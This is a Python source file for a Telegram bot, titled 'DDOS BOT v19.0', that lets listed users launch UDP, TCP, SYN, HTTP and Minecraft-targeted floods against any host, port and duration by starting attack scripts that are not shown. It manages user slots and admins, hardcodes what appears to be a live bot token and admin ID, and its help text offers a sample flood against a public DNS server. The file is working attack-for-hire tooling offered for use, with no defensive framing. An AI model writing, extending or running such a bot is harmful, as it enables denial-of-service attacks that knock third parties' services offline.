#!/usr/bin/env python3
"""
💀 DDOS BOT v19.0 - REAL-TIME OUTPUT 💀
Shows attack output in Codespace terminal
"""

import telebot
import subprocess
import os
import threading
import time
import sys
import uuid

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
USER_FILE = "users.txt"

MAX_SLOTS_PER_USER = 10
MAX_GLOBAL_SLOTS = 50

allowed_users = []
running_attacks = {}
attack_slots = {}
global_slot_count = 0
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ========== ATTACK SCRIPTS ==========
ATTACKS = {
    'udp': ('udp.py', 'UDP Flood'),
    'tcp': ('tcp.py', 'TCP Flood'),
    'syn': ('syn.py', 'SYN Flood'),
    'httpflood': ('httpflood.py', 'HTTP Flood'),
    'tudp': ('tudp.py', 'TUDP Monster'),
    'mc': ('mc.py', 'Minecraft Attack'),
    'mcquery': ('mcquery.py', 'Minecraft Query'),
    'mchandshake': ('mchandshake.py', 'Minecraft Handshake'),
    'udpbypass': ('udpbypass.py', 'UDP Bypass'),
    'tcpbypass': ('tcpbypass.py', 'TCP Bypass'),
    'gudp': ('gudp.py', 'GUDP Flood'),
}

# ========== FUNCTIONS ==========

def load_users():
    try:
        with open(os.path.join(BASE_DIR, USER_FILE), "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
        f.write(f"{user_id}\n")

def can_start_attack(user_id):
    with lock:
        user_slots = attack_slots.get(user_id, 0)
        if user_slots >= MAX_SLOTS_PER_USER:
            return False, f"❌ Max slots reached ({MAX_SLOTS_PER_USER})"
        if global_slot_count >= MAX_GLOBAL_SLOTS:
            return False, f"❌ Global limit reached ({MAX_GLOBAL_SLOTS})"
        return True, "OK"

def add_attack_slot(user_id):
    with lock:
        global global_slot_count
        attack_slots[user_id] = attack_slots.get(user_id, 0) + 1
        global_slot_count += 1

def remove_attack_slot(user_id):
    with lock:
        global global_slot_count
        if user_id in attack_slots and attack_slots[user_id] > 0:
            attack_slots[user_id] -= 1
            global_slot_count -= 1
            if attack_slots[user_id] == 0:
                del attack_slots[user_id]

def execute_attack(user_id, attack_type, target, port, duration):
    if attack_type not in ATTACKS:
        return False, f"Unknown attack: {attack_type}"
    
    can_start, msg = can_start_attack(user_id)
    if not can_start:
        return False, msg
    
    script, description = ATTACKS[attack_type]
    script_path = os.path.join(BASE_DIR, script)
    
    if not os.path.exists(script_path):
        return False, f"Script not found: {script}"
    
    try:
        attack_id = str(uuid.uuid4())[:8]
        
        # Build command - show output in terminal
        cmd = ["python3", "-u", script_path, target, str(port), str(duration)]
        
        print(f"\n{'='*60}")
        print(f"🔥 ATTACK STARTED: {attack_type.upper()}")
        print(f"📋 ID: {attack_id}")
        print(f"🎯 Target: {target}:{port}")
        print(f"⏱️ Duration: {duration}s")
        print(f"📁 Script: {script_path}")
        print(f"{'='*60}\n")
        
        # Run with real-time output
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        # Print output in real-time
        def print_output():
            for line in process.stdout:
                print(f"[{attack_type.upper()}] {line.strip()}")
        
        output_thread = threading.Thread(target=print_output, daemon=True)
        output_thread.start()
        
        add_attack_slot(user_id)
        
        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append({
                'id': attack_id,
                'process': process,
                'attack_type': attack_type,
                'target': target,
                'port': port,
                'duration': duration,
                'start_time': time.time()
            })
        
        def cleanup():
            try:
                process.wait()
                print(f"\n✅ {attack_type.upper()} attack completed!\n")
            except:
                pass
            finally:
                remove_attack_slot(user_id)
        
        threading.Thread(target=cleanup, daemon=True).start()
        
        return True, f"✅ {description} started!\n📋 ID: {attack_id}\n🎯 {target}:{port}\n⏱️ {duration}s\n📊 Watch terminal for output!"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id, attack_id=None):
    with lock:
        if user_id not in running_attacks:
            return 0, "No attacks found"
        
        count = 0
        attacks_to_remove = []
        
        for attack in running_attacks[user_id]:
            if attack_id and attack.get('id') != attack_id:
                continue
            try:
                attack['process'].terminate()
                time.sleep(0.5)
                attack['process'].kill()
                print(f"\n🛑 Stopped {attack['attack_type'].upper()} attack {attack['id']}\n")
                remove_attack_slot(user_id)
                count += 1
                attacks_to_remove.append(attack)
            except:
                pass
        
        for attack in attacks_to_remove:
            running_attacks[user_id].remove(attack)
        
        if not running_attacks[user_id]:
            del running_attacks[user_id]
        
        return count, f"✅ Stopped {count} attack(s)"

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v19.0 - REAL-TIME OUTPUT 💀

🔥 ATTACKS (Output shows in Codespace terminal):
/udp <target> <port> <time> - UDP Flood
/tcp <target> <port> <time> - TCP Flood
/syn <target> <port> <time> - SYN Flood
/httpflood <target> <port> <time> - HTTP Flood
/tudp <target> <port> <time> - TUDP Monster
/mc <target> <port> <time> - Minecraft Attack
/mcquery <target> <port> <time> - Minecraft Query
/mchandshake <target> <port> <time> - Minecraft Handshake
/udpbypass <target> <port> <time> - UDP Bypass
/tcpbypass <target> <port> <time> - TCP Bypass
/gudp <target> <port> <time> - GUDP Flood

🛑 CONTROL:
/stopall - Stop all attacks
/stop <id> - Stop specific attack
/status - Check attacks
/slots - Check slots
/id - Get your ID

Example: /tudp 8.8.8.8 53 10""")

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['slots'])
def slots_command(message):
    user_id = str(message.chat.id)
    with lock:
        user_slots = attack_slots.get(user_id, 0)
        response = f"""📊 SLOTS

👤 Your slots: {user_slots}/{MAX_SLOTS_PER_USER}
🌐 Global slots: {global_slot_count}/{MAX_GLOBAL_SLOTS}
📌 Available: {MAX_SLOTS_PER_USER - user_slots}"""
        bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks:
            bot.reply_to(message, "📭 No active attacks")
            return
        
        msg = f"🔥 ACTIVE ATTACKS ({len(running_attacks[user_id])})\n\n"
        for attack in running_attacks[user_id]:
            elapsed = int(time.time() - attack['start_time'])
            remaining = max(0, attack['duration'] - elapsed)
            msg += f"🆔 {attack['id']}\n"
            msg += f"📌 {attack['attack_type'].upper()} → {attack['target']}:{attack['port']}\n"
            msg += f"⏱️ {remaining}s remaining\n"
            msg += f"🛑 /stop {attack['id']}\n\n"
        
        bot.reply_to(message, msg)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /stop <attack_id>")
        return
    
    attack_id = parts[1]
    count, msg = stop_user_attacks(user_id, attack_id)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count, msg = stop_user_attacks(user_id)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    bot.reply_to(message, """👑 ADMIN:
/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users
/globalstop - Stop ALL attacks""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(os.path.join(BASE_DIR, USER_FILE), "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        try:
            info = bot.get_chat(int(uid))
            username = f"@{info.username}" if info.username else "Unknown"
            response += f"• {username} (ID: {uid})\n"
        except:
            response += f"• ID: {uid}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['globalstop'])
def globalstop_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    
    total = 0
    with lock:
        for uid in list(running_attacks.keys()):
            count, _ = stop_user_attacks(uid)
            total += count
    
    bot.reply_to(message, f"✅ Stopped {total} global attacks")

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
            return
        
        target = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except:
            bot.reply_to(message, "❌ Port and time must be numbers")
            return
        
        if duration < 1 or duration > 600:
            bot.reply_to(message, "❌ Duration must be 1-600 seconds")
            return
        
        status_msg = bot.reply_to(message, f"⚡ Starting {attack_type.upper()} attack...")
        success, msg = execute_attack(user_id, attack_type, target, port, duration)
        
        if success:
            bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
    
    return handler

# Register all attacks
attacks = [
    'udp', 'tcp', 'syn', 'httpflood',
    'tudp', 'mc', 'mcquery', 'mchandshake',
    'udpbypass', 'tcpbypass', 'gudp'
]

for attack in attacks:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("=" * 60)
    print("💀 DDOS BOT v19.0 - REAL-TIME OUTPUT 💀")
    print("=" * 60)
    
    # Check scripts
    for name, (script, desc) in ATTACKS.items():
        script_path = os.path.join(BASE_DIR, script)
        if os.path.exists(script_path):
            print(f"[+] {script} - READY")
        else:
            print(f"[-] {script} - MISSING")
    
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Max slots per user: {MAX_SLOTS_PER_USER}")
    print(f"[+] Max global slots: {MAX_GLOBAL_SLOTS}")
    print("=" * 60)
    print("[+] Bot running! Press Ctrl+C to stop.")
    print("[+] Attack output will appear here in real-time!")
    print("=" * 60)
    bot.polling(none_stop=True)
